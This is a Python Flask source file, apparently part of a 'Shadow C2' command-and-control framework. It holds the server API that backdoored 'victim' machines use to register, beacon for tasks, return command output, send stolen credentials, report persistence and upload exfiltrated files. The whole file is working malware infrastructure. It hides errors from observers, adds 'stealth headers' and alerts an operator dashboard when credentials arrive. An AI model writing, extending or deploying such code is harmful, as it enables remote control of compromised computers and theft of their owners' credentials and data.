#!/usr/bin/env python3
"""Shadow C2 — C2 API Endpoints (Backdoor ↔ Server communication)"""

import json
import base64
import time
from flask import Blueprint, request, jsonify, current_app, send_file

api_bp = Blueprint('api', __name__, url_prefix='/api')


def get_handler():
    return current_app.config["C2_HANDLER"]

def get_crypto():
    return current_app.config["C2_CRYPTO"]

def get_db():
    return current_app.config["DATABASE"]


@api_bp.route('/register', methods=['POST'])
def register():
    """Victim registration endpoint."""
    try:
        data = _extract_data(request)
        handler = get_handler()
        source_ip = request.remote_addr
        result = handler.handle_registration(data, source_ip)

        # Emit to dashboard via SocketIO
        socketio = current_app.config.get("SOCKETIO")
        if socketio:
            socketio.emit('new_victim', {
                'uuid': data.get('uuid', ''),
                'ip': data.get('ip', source_ip),
                'hostname': data.get('hostname', ''),
            }, namespace='/dashboard')

        return _json_response(result)
    except Exception as e:
        return _json_response({"status": "ok"})  # Never reveal errors


@api_bp.route('/beacon', methods=['POST'])
def beacon():
    """Heartbeat / task fetch endpoint."""
    try:
        data = _extract_data(request)
        handler = get_handler()
        result = handler.handle_beacon(data)
        return _json_response(result)
    except Exception:
        return _json_response({"tasks": []})


@api_bp.route('/results', methods=['POST'])
def results():
    """Command result submission."""
    try:
        data = _extract_data(request)
        handler = get_handler()
        result = handler.handle_result(data)

        # Real-time update to dashboard
        socketio = current_app.config.get("SOCKETIO")
        if socketio:
            socketio.emit('command_result', {
                'uuid': data.get('uuid', ''),
                'task_id': data.get('task_id'),
                'output': data.get('output', '')[:5000],
                'status': data.get('status', 'completed'),
            }, namespace='/dashboard')

        return _json_response(result)
    except Exception:
        return _json_response({"status": "received"})


@api_bp.route('/credentials', methods=['POST'])
def credentials():
    """Credential submission from victim."""
    try:
        data = _extract_data(request)
        handler = get_handler()
        result = handler.handle_credentials(data)

        socketio = current_app.config.get("SOCKETIO")
        if socketio:
            socketio.emit('credentials_found', {
                'uuid': data.get('uuid', ''),
                'count': len(data.get('credentials', [])),
            }, namespace='/dashboard')

        return _json_response(result)
    except Exception:
        return _json_response({"status": "received"})


@api_bp.route('/persistence', methods=['POST'])
def persistence():
    """Persistence installation report."""
    try:
        data = _extract_data(request)
        handler = get_handler()
        result = handler.handle_persistence(data)
        return _json_response(result)
    except Exception:
        return _json_response({"status": "recorded"})


@api_bp.route('/key-exchange', methods=['POST'])
def key_exchange():
    """Complete ECDH key exchange."""
    try:
        data = _extract_data(request)
        handler = get_handler()
        result = handler.handle_key_exchange(data)
        return _json_response(result)
    except Exception:
        return _json_response({"status": "ok"})


@api_bp.route('/upload', methods=['POST'])
def upload():
    """File upload from victim."""
    try:
        handler = get_handler()
        uuid = request.form.get('uuid', '')
        if 'file' not in request.files:
            return _json_response({"status": "error", "message": "no file"})

        f = request.files['file']
        data = f.read()
        result = handler.handle_file_upload(uuid, f.filename, data,
                                            request.form.get('remote_path', ''))
        return _json_response(result)
    except Exception:
        return _json_response({"status": "error"})


@api_bp.route('/download/<int:file_id>', methods=['GET'])
def download(file_id):
    """File download for victim."""
    try:
        db = get_db()
        # Get file record
        row = db.conn.execute("SELECT * FROM files WHERE id=?", (file_id,)).fetchone()
        if not row:
            return _json_response({"status": "not found"}), 404

        file_info = dict(row)
        filepath = file_info.get("local_path", "")
        if filepath and __import__("os").path.exists(filepath):
            return send_file(filepath, as_attachment=True,
                           download_name=file_info.get("filename", "file"))
        return _json_response({"status": "not found"}), 404
    except Exception:
        return _json_response({"status": "error"})


# -- helpers -----------------------------------------------------------------

def _extract_data(req) -> dict:
    """Extract data from request, handling both encrypted and plain JSON."""
    if req.is_json:
        data = req.get_json(silent=True) or {}
        # Check for encrypted wrapper
        if "data" in data and len(data) <= 3:
            try:
                raw = base64.b64decode(data["data"])
                uuid = data.get("uuid", "")
                if uuid:
                    crypto = get_crypto()
                    decrypted = crypto.decrypt_message(uuid, raw)
                    if decrypted:
                        return json.loads(decrypted)
            except Exception:
                pass
        return data

    # Try raw body
    try:
        return json.loads(req.data)
    except Exception:
        return {}


def _json_response(data: dict, status: int = 200):
    """Build JSON response with stealth headers."""
    resp = jsonify(data)
    resp.status_code = status
    resp.headers["X-Request-ID"] = str(int(time.time() * 1000) % 1000000)
    resp.headers["X-Content-Type-Options"] = "nosniff"
    resp.headers["Cache-Control"] = "no-cache, no-store"
    return resp
